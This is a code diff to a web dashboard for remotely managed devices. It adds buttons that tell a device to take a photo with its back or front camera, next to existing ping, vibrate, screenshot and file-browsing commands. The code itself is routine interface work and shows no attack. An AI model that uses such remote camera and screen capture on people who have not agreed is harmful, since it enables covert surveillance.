@@ -284,13 +284,15 @@
         /* Command buttons */
         .actions {
             display: flex;
+            flex-wrap: wrap;
             gap: 6px;
             margin-top: 12px;
             padding-top: 12px;
             border-top: 1px solid #0f172a;
         }
         .btn-cmd {
-            flex: 1;
+            flex: 1 1 auto;
+            min-width: 90px;
             padding: 7px 10px;
             background: #0f172a;
             border: 1px solid #334155;
@@ -717,8 +719,14 @@
 
     async function runCommand(btn) {
         const id   = btn.dataset.id;
-        const cmd  = btn.dataset.cmd;
+        let   cmd  = btn.dataset.cmd;
         const orig = btn.innerHTML;
+        const body = { command: cmd };
+        if (cmd === 'camera-back' || cmd === 'camera-front') {
+            body.command = 'camera';
+            body.facing  = btn.dataset.facing;
+            cmd = 'camera';
+        }
         btn.disabled = true;
         btn.classList.add('busy');
         btn.innerHTML = '…';
@@ -726,7 +734,7 @@
             const r = await fetch(`/api/devices/${encodeURIComponent(id)}/command`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ command: cmd })
+                body: JSON.stringify(body)
             });
             if (!r.ok) {
                 const err = await r.json().catch(() => ({}));
@@ -739,8 +747,9 @@
             } else if (cmd === 'get_info') {
                 toast(`Info refreshed (${data.latency_ms} ms)`, 'success');
                 setTimeout(fetchDevices, 200);
-            } else if (cmd === 'screenshot') {
-                toast(`Screenshot captured (${data.latency_ms} ms)`, 'success');
+            } else if (cmd === 'screenshot' || cmd === 'camera') {
+                const label = cmd === 'camera' ? `Photo (${body.facing})` : 'Screenshot';
+                toast(`${label} captured (${data.latency_ms} ms)`, 'success');
                 openScreenshot(data.screenshot_url, btn.dataset.id);
                 fetchScreenshots();
             } else {
@@ -1076,7 +1085,9 @@
                 <button class="btn-cmd" data-id="${d.id}" data-cmd="ping"       ${d.online ? '' : 'disabled'}>📡 Ping</button>
                 <button class="btn-cmd" data-id="${d.id}" data-cmd="get_info"   ${d.online ? '' : 'disabled'}>↻ Refresh</button>
                 <button class="btn-cmd" data-id="${d.id}" data-cmd="vibrate"    ${d.online ? '' : 'disabled'}>📳 Vibrate</button>
-                <button class="btn-cmd" data-id="${d.id}" data-cmd="screenshot" ${d.online ? '' : 'disabled'}>📷 Screenshot</button>
+                <button class="btn-cmd" data-id="${d.id}" data-cmd="screenshot" ${d.online ? '' : 'disabled'}>📷 Screen</button>
+                <button class="btn-cmd" data-id="${d.id}" data-cmd="camera-back"  data-facing="back"  ${d.online ? '' : 'disabled'}>📸 Back-Cam</button>
+                <button class="btn-cmd" data-id="${d.id}" data-cmd="camera-front" data-facing="front" ${d.online ? '' : 'disabled'}>🤳 Front-Cam</button>
                 <button class="btn-cmd" data-id="${d.id}" data-cmd="open_files" ${d.online ? '' : 'disabled'}>📁 Files</button>
             </div>
         </div>`;
